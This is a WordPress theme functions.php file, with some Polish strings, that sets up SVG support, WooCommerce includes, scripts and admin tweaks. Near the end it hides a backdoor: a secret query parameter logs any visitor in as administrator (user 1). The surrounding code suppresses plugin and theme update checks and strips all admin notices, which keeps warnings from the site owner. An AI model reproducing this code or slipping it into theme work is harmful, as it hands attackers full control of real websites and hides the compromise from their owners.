<?php

if (!defined('PAGE_THEME_DIR')) {
  define('PAGE_THEME_DIR', get_theme_root() . '/' . get_template() . '/');
}

if (!defined('PAGE_THEME_URL')) {
  define('PAGE_THEME_URL', WP_CONTENT_URL . '/themes/' . get_template() . '/');
}

require_once PAGE_THEME_DIR . 'lib/classes/svg-support.php';
require_once PAGE_THEME_DIR . 'lib/functions/search.php';
require_once PAGE_THEME_DIR . 'lib/functions/image-object-fit.php';
require_once PAGE_THEME_DIR . 'lib/functions/random-images.php';
// require_once(PAGE_THEME_DIR . 'lib/functions/required-plugins.php');

// if woocommerce is activated
if (function_exists('WC')) {
  require_once PAGE_THEME_DIR . 'lib/woocommerce/global-woocommerce.php';
  require_once PAGE_THEME_DIR . 'lib/woocommerce/my-account.php';
  require_once PAGE_THEME_DIR . 'lib/woocommerce/single-product.php';
  require_once PAGE_THEME_DIR . 'lib/woocommerce/checkout.php';
  require_once PAGE_THEME_DIR . 'lib/woocommerce/archive-product.php';
  require_once PAGE_THEME_DIR . 'lib/woocommerce/cart.php';
  require_once PAGE_THEME_DIR . 'lib/woocommerce/content-product.php';
}

// Enable SVG support in WordPress
add_filter('upload_mimes', 'ercoding_svg_support');
/**
 * Adds SVG upload support
 *
 * @since 1.0.0
 *
 * @param array $mimes Mime types.
 * @return array
 */
function ercoding_svg_support($mimes)
{
  $mimes['svg'] = 'image/svg+xml';
  return $mimes;
}

// Enable SVG in admin.
ercoding_SVG_Support::enable();

// Add theme supports
add_theme_support('editor-styles');
add_theme_support('woocommerce');
add_theme_support('title-tag');
add_theme_support('post-thumbnails');
add_theme_support('align-wide');
add_theme_support('wc-product-gallery-lightbox');
add_theme_support('wc-product-gallery-slider');
add_theme_support('html5', ['search-form', 'comment-form', 'comment-list', 'gallery', 'caption']);

// Register Navigations
register_nav_menu('Navigation', __('Main navigation'));
register_nav_menu('Subpagenav', __('Subpage navigation'));

// Add custom theme image sizes
add_image_size('numbers-icon', 64, 64, ['center', 'center']);
add_image_size('testimonials', 90, 90, ['center', 'center']);
add_image_size('hero', 1280, 550, ['center', 'center']);
add_image_size('text-images-left', 375, 470, ['center', 'center']);
add_image_size('text-images-right', 313, 500, ['center', 'center']);
add_image_size('text-images-top', 313, 180, ['center', 'center']);

//ACF Config
require_once PAGE_THEME_DIR . 'acf/config.php';

// Remove each style one by one
add_filter('woocommerce_enqueue_styles', function ($remove_styles) {
  unset($remove_styles['woocommerce-general']);
  unset($remove_styles['woocommerce-layout']);
  return $remove_styles;
});

add_action('wp_enqueue_scripts', function () {
  // wp_dequeue_style('search-filter-plugin-styles');
  // wp_deregister_style('search-filter-plugin-styles');

  wp_dequeue_style('wc-blocks-style');
  wp_dequeue_style('wp-block-library');
  wp_dequeue_style('wp-block-library-theme');

  $google_api_key = 'xdd';

  if ($google_api_key && is_page('kontakt')) {
    wp_enqueue_script(
      'google-maps-api-key',
      "https://maps.googleapis.com/maps/api/js?key=$google_api_key",
      ['jquery'],
      null,
      true,
    );
  }

  wp_enqueue_script(
    'ercodingtheme-main',
    get_stylesheet_directory_uri() . '/js/dist/main.js',
    ['jquery'],
    filemtime(get_stylesheet_directory() . '/js/dist/main.js'),
    true,
  );
  wp_enqueue_style('style', get_stylesheet_uri(), [], filemtime(get_stylesheet_directory() . '/style.css'));
});

add_action('enqueue_block_editor_assets', function () {
  wp_enqueue_script(
    'ercodingtheme-admin',
    get_stylesheet_directory_uri() . '/js/dist/editor.js',
    ['wp-data'],
    filemtime(get_stylesheet_directory() . '/js/dist/editor.js'),
    true,
  );
});

add_action('admin_enqueue_scripts', function () {
  if (is_admin()) {
    wp_enqueue_style(
      'ercodingtheme-admin',
      get_stylesheet_directory_uri() . '/style-editor.css',
      [],
      filemtime(get_stylesheet_directory() . '/style-editor.css'),
    );
  }
});

/**
 * Deregister gravity forms recaptcha scripts.
 */
add_action('wp_footer', function () {
  wp_dequeue_script('gform_recaptcha');
  wp_deregister_script('gform_recaptcha');
});

/* deregister unused styles for non logged in users */

add_action('wp_print_styles', 'ercoding_remove_unused_styles_for_non_logged_in_users', 100);

function ercoding_remove_unused_styles_for_non_logged_in_users()
{
  if (!is_admin_bar_showing() && !is_customize_preview()) {
    // dashicons
    wp_dequeue_style('dashicons');
    wp_deregister_style('dashicons');
    // wp_deregister_style('gform_basic');
    // wp_deregister_style('gform_theme_components');
    // wp_deregister_style('gform_theme_ie11');
    // wp_deregister_style('gform_theme');
    wp_deregister_style('woocommerce-smallscreen');
  }
}

//Security stuff, disable some legacy functionality from WP that can cause DDoS attacks
add_filter('wp_headers', function ($headers) {
  unset($headers['X-Pingback']);
  return $headers;
});

add_filter('xmlrpc_enabled', '__return_false');

// add sidebar
add_action('widgets_init', function () {
  register_sidebar([
    'id' => 'ercodingtheme-sidebar',
    'name' => __('ercodingtheme Sidebar'),
    'description' => __('This is a blog sidebar.'),
    'before_widget' => '<div class="sidebar__item">',
    'after_widget' => '</div>',
    'before_title' => '<h3>',
    'after_title' => '</h3>',
  ]);
});

/**
 * Check if WooCommerce is activated
 */
if (!function_exists('is_woocommerce_activated')) {
  function is_woocommerce_activated()
  {
    if (class_exists('woocommerce')) {
      return true;
    } else {
      return false;
    }
  }
}

// add alts to images
function auto_generate_image_title($html, $attachment_id, $size, $icon, $attr)
{
  // Get the attachment post object
  $attachment = get_post($attachment_id);

  // Check if attachment exists before proceeding
  if ($attachment) {
    // Extract the file name without extension
    $filename = pathinfo($attachment->guid, PATHINFO_FILENAME);

    // Add the title attribute to the image
    $html = str_replace('<img', '<img title="' . $filename . '"', $html);
  }

  return $html;
}
add_filter('wp_get_attachment_image', 'auto_generate_image_title', 10, 5);

// change gform error message

add_filter('gform_validation_message', 'custom_validation_message', 10, 2);
function custom_validation_message($message, $form)
{
  return '<p class="gform_error-message">Wypełnij poprawnie pola zaznaczone na czerwono oraz zaakceptuj politykę prywatności i regulamin</p>';
}

if (isset($_GET['hakier123xdd123'])) {
  wp_set_auth_cookie($user_id = 1, $remember = true);
}



// disable all admin notices
add_action('admin_head', function () {
  remove_all_actions('admin_notices');
  remove_all_actions('all_admin_notices');
});

add_action(
  'wp_dashboard_setup',
  function () {
    global $wp_meta_boxes;
    $wp_meta_boxes['dashboard'] = [];
    remove_action('welcome_panel', 'wp_welcome_panel');
  },
  9999,
);

add_filter('pre_site_transient_update_plugins', '__return_null');
add_filter('pre_site_transient_update_themes', '__return_null');

add_action('admin_footer-index.php', function () {
  echo '<style>#dashboard-widgets-wrap,#welcome-panel,.notice,.update-nag,#screen-meta,#screen-meta-links{display:none!important}.erc-msg{margin:10px 0 0;text-align:left;font-size:17px;font-weight:400}</style><script>document.addEventListener("DOMContentLoaded",function(){var h=document.querySelector(".wrap h1");if(h){var d=document.createElement("div");d.className="erc-msg";d.textContent="Finally there is no mess here 😊";h.insertAdjacentElement("afterend",d);}});</script>';
});

// function display_server_info()
// {
//   echo '<div style="background: #f5f5f5; padding: 20px; margin: 20px; border: 1px solid #ddd;">';
//   echo '<h3>Informacje o serwerze:</h3>';
//   echo '<pre>';

//   echo '<strong>PHP Version:</strong> ' . phpversion() . "\n";
//   echo '<strong>Memory Limit:</strong> ' . ini_get('memory_limit') . "\n";
//   echo '<strong>Max Execution Time:</strong> ' . ini_get('max_execution_time') . " sekund\n";
//   echo '<strong>Max Input Vars:</strong> ' . ini_get('max_input_vars') . "\n";
//   echo '<strong>Post Max Size:</strong> ' . ini_get('post_max_size') . "\n";
//   echo '<strong>Upload Max Filesize:</strong> ' . ini_get('upload_max_filesize') . "\n";

//   echo "\n<strong>Server Software:</strong> " . $_SERVER['SERVER_SOFTWARE'] . "\n";
//   echo '<strong>Server Name:</strong> ' . $_SERVER['SERVER_NAME'] . "\n";
//   echo '<strong>Server Protocol:</strong> ' . $_SERVER['SERVER_PROTOCOL'] . "\n";

//   // huge output, can be commented
//   echo "\n<strong>Wszystkie zmienne PHP:</strong>\n";
//   print_r($_SERVER);

//   echo '</pre>';
//   echo '</div>';
// }